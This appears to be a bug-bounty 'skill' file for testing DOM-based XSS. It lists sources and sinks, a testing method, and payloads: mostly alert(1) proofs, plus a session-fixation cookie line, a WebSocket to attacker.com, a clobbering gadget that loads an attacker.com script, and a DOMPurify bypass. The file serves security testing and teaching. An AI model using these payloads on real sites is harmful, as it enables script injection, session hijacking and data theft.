---
name: "dom-cross-site-scripting"
version: "2.0"
category: "injection"
subcategory: "xss"
phase: "exploitation"
tags: ["bug-bounty", "injection", "xss", "dom-xss", "dom-clobbering"]
tools: ["dalfox"]
follow_up_skills: ["xss", "xss-polyglot", "information-disclosure-harvesting"]
prerequisite_skills: ["xss", "cross-site-scripting"]
description: "Bug bounty skill: dom cross site scripting - exploitation phase, injection category"
---
# DOM XSS

## Summary

DOM-based XSS vulnerabilities arise when client-side JavaScript passes data from an attacker-controllable **source** to a dangerous **sink** without sanitization. Unlike reflected or stored XSS, the payload never reaches the server — it's processed entirely in the browser's DOM.

## Key Concepts

- **Source**: A JavaScript property that can contain attacker-controlled data (`location.search`, `document.cookie`, `document.referrer`, `window.name`, `localStorage`, `postMessage`, etc.)
- **Sink**: A dangerous function or DOM object that can execute or render attacker data unsafely (`eval()`, `innerHTML`, `location.href`, `document.write()`, etc.)
- **DOM Clobbering**: Overwriting JavaScript variables by injecting HTML elements with matching `id` or `name` attributes
- **No Server Trip**: The payload exists only in the URL fragment or client-side storage — server logs may show no malicious data

## Technical Details

### Common Sources

```
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location.href / location.search / location.hash / location.pathname
document.cookie
document.referrer
window.name
history.pushState / history.replaceState
localStorage / sessionStorage
IndexedDB
postMessage() received data
```

### Common Sinks by Category

**Open Redirect / Navigation:**
```
location / location.host / location.hostname / location.href
location.pathname / location.search / location.protocol
location.assign() / location.replace()
open()
domElem.srcdoc
XMLHttpRequest.open() / .send()
jQuery.ajax() / $.ajax()
```

**JavaScript Injection (code execution):**
```
eval()
Function() constructor
setTimeout() / setInterval() / setImmediate()
execCommand() / execScript() / msSetImmediate()
range.createContextualFragment()
crypto.generateCRMFRequest()
```

**DOM Data Manipulation (HTML injection):**
```
someDOMElement.innerHTML / .outerHTML
someDOMElement.insertAdjacentHTML
document.write() / document.writeln()
someDOMElement.setAttribute()
someDOMElement.src / .href / .action
scriptElement.text / .textContent / .innerText
someDOMElement.value / .name / .target
```

**Cookie Manipulation:**
```
document.cookie
```

**Storage Manipulation (persistent):**
```
sessionStorage.setItem()
localStorage.setItem()
```

**WebSocket URL Poisoning:**
```
WebSocket() constructor
```

**Ajax Request Manipulation:**
```
XMLHttpRequest.setRequestHeader()
XMLHttpRequest.open()
jQuery.globalEval() / $.globalEval()
```

**File Path Manipulation:**
```
FileReader.readAsArrayBuffer() / .readAsBinaryString()
FileReader.readAsDataURL() / .readAsText()
FileReader.readAsFile()
```

**Client-Side SQL Injection (WebSQL):**
```
executeSql()
```

**XPath Injection:**
```
document.evaluate()
someDOMElement.evaluate()
```

**JSON Injection:**
```
JSON.parse()
jQuery.parseJSON() / $.parseJSON()
```

**Web Message Manipulation:**
```
postMessage()
```

**Denial of Service:**
```
requestFileSystem()
RegExp()
```

**Document Domain Manipulation:**
```
document.domain
```

**Link Manipulation:**
```
someDOMElement.href
someDOMElement.src
someDOMElement.action
```

### Important Note on innerHTML

The `innerHTML` sink does **not** execute `<script>` elements on modern browsers, nor do `svg onload` events fire when inserted via `innerHTML`. Alternative elements like `<img src=x onerror=alert(1)>` or `<iframe src=javascript:...>` are required.

## Methodology

1. **Load the page in a browser** with developer tools open.

2. **Search the source code** for dangerous sinks: `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `location`, `setTimeout`, `setInterval`, `Function()`, `document.cookie`, `postMessage`, `WebSocket`.

3. **Trace each sink back to its source** — identify which variables flow into it and whether they are attacker-controllable (URL parameters, hash fragment, cookies, referrer, localStorage, postMessage).

4. **Confirm the sink uses attacker data without sanitization** — inject a unique marker via each potential source and check if it appears in the sink output.

5. **Craft a payload** appropriate for the sink type:
   - HTML sink (`innerHTML`): `<img src=x onerror=alert(1)>`
   - URL sink (`location`): `javascript:alert(1)` or open redirect
   - JS sink (`eval`): raw JS payload
   - Cookie sink: session fixation

6. **Verify** the payload executes in the browser without user interaction (or with expected interaction).

## Exploitation Payloads

### Open Redirect via DOM

```
# location.href sink
javascript:alert(1)

# location.hash sink — no server reflection needed
https://target.com/page#javascript:alert(1)
```

### HTML Injection via innerHTML (no script execution)

```html
<img src=x onerror=alert(1)>
<iframe src=javascript:alert(1)>
<body onload=alert(1)>
```

### JavaScript Injection via eval

```js
eval('alert(1)')
Function('alert(1)')()
setTimeout('alert(1)', 0)
```

### Cookie Manipulation — Session Fixation

```js
document.cookie = "session=attacker-session-id; path=/";
```

### WebSocket URL Poisoning

```js
new WebSocket("wss://attacker.com/steal");
```

### Client-Side SQL Injection (WebSQL)

```js
db.executeSql("SELECT * FROM users WHERE id = " + attackerData);
```

## DOM Clobbering

DOM Clobbering overwrites global JavaScript variables by naming HTML elements with matching `id` or `name` attributes. This can cause unexpected script behavior and bypass sanitizers.

### Clobbering `x.y.value`

```html
<form id=x><output id=y>I've been clobbered</output>
```

```js
// Sink
alert(x.y.value);
```

### Clobbering `x.y` (DOM collection via id + name)

```html
<a id=x><a id=x name=y href="Clobbered">
```

```js
alert(x.y)
```

### Clobbering `x.y.z` (3 levels deep)

```html
<form id=x name=y><input id=z></form>
<form id=x></form>
```

```js
alert(x.y.z)
```

### Clobbering `a.b.c.d` (4+ levels via nested iframes)

```html
<iframe name=a srcdoc="
<iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>"></iframe>
<style>@import '//portswigger.net';</style>
```

```js
alert(a.b.c.d)
```

### Clobbering `forEach` (Chrome only)

```html
<form id=x>
  <input id=y name=z>
  <input id=y>
</form>
```

```js
x.y.forEach(element => alert(element))
```

### Clobbering `document.getElementById()` via `<html>`/`<body>` tag

```html
<html id="cdnDomain">clobbered</html>
<svg><body id=cdnDomain>clobbered</body></svg>
```

```js
alert(document.getElementById('cdnDomain').innerText); // "clobbered"
```

### Clobbering `x.username` / `x.password` (protocol-based)

```html
<a id=x href="ftp:Clobbered-username:Clobbered-Password@a">
```

```js
alert(x.username) // "Clobbered-username"
alert(x.password) // "Clobbered-password"
```

### Clobbering (Firefox only) — base + href

```html
<base href=a:abc><a id=x href="Firefox<>">
```

```js
alert(x) // "Firefox<>"
```

### Clobbering (Chrome only) — base + name collection

```html
<base href="a://Clobbered<>"><a id=x name=x><a id=x name=xyz href=123>
```

```js
alert(x.xyz) // "a://Clobbered<>"
```

### Clobbering — Overwrite Variable (library bypass)

```html
<a id=someObject>
<a id=someObject name=url href=//attacker.com/malicious.js>
```

If JS does `let someObject = window.someObject || {}; script.src = someObject.url;` — attacker URL is loaded.

### Clobbering — DOMPurify Bypass with cid:

```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

DOMPurify allows `cid:` protocol and does not URL-encode double-quotes in it. `&quot;` decodes at runtime, escaping the attribute and creating an `onerror` event.

### Clobbering — Form Attributes Clobber

```html
<form id=library>
  <input id=attributes>
</form>
```

Some libraries iterate over `form.attributes` to sanitize; clobbering `attributes` with an `input` element hides the real attributes.

## Detection Commands

```bash
# Search for DOM sinks in JS files
curl -s "https://target.com/app.js" | grep -E "(innerHTML|outerHTML|document\.write|eval\(|location\.href|setTimeout\(|postMessage)"

# Search for sources
curl -s "https://target.com/app.js" | grep -E "(location\.search|location\.hash|document\.cookie|document\.referrer|localStorage\.getItem)"
```

## Tools

- **Burp DOM Invader** — Automated DOM XSS detection inside Burp
- **Chrome DevTools** — Sources tab → search for sinks; set breakpoints
- **DOMXSS Wiki** — Updated list of sources and sinks: https://github.com/wisec/domxsswiki/wiki
- **DOMClobbering** (SoheilKhodayari) — Comprehensive list of DOM Clobbering payloads
- **Dom-Explorer** (yeswehack) — Web-based HTML parser/sanitizer tester
- **Dom-Explorer Live** (yeswehack) — Live tool to find mutated XSS vulnerabilities

## Bypass Techniques

- **innerHTML no-script limitation**: Use `<img src=x onerror=>` or `<iframe src=javascript:>` instead of `<script>` tags
- **DOMPurify bypass via cid:** — Double-quotes in `cid:` URIs are not URL-encoded, allowing attribute breakout on decode
- **Form element clobbering**: Override `.attributes` property with an `<input id=attributes>` to bypass sanitizer iteration
- **Hash-only payloads**: DOM XSS often works via `location.hash` which is never sent to the server — no server-side logging of the attack

## Not a Finding If

- **Attacker data flows through a safe API** — `textContent` instead of `innerHTML`, `encodeURI()` before eval, etc.
- **Sink is reached but data is validated** — Regex whitelist or type check prevents malicious input.
- **Data is attacker-controllable but never reaches a sink** — A source may exist without any sink consuming it.
- **innerHTML with `<script>` tag** — Will not execute in modern browsers; must use `<img onerror>` or similar.

## Notes

- DOM XSS can be more dangerous than reflected XSS because the payload never appears in server logs — defenders can't detect it retroactively.
- URL fragments (`#`) are the most common source because they are never sent to the server.
- `postMessage` listeners are a common overlooked source — any window can send a message.
- DOM Clobbering is especially effective against libraries that use `window.x || {}` patterns.

## References

- https://portswigger.net/web-security/dom-based
- https://github.com/wisec/domxsswiki/wiki
- https://portswigger.net/research/dom-clobbering-strikes-back
- https://portswigger.net/web-security/dom-based/dom-clobbering
- https://github.com/SoheilKhodayari/DOMClobbering
- https://github.com/yeswehack/Dom-Explorer
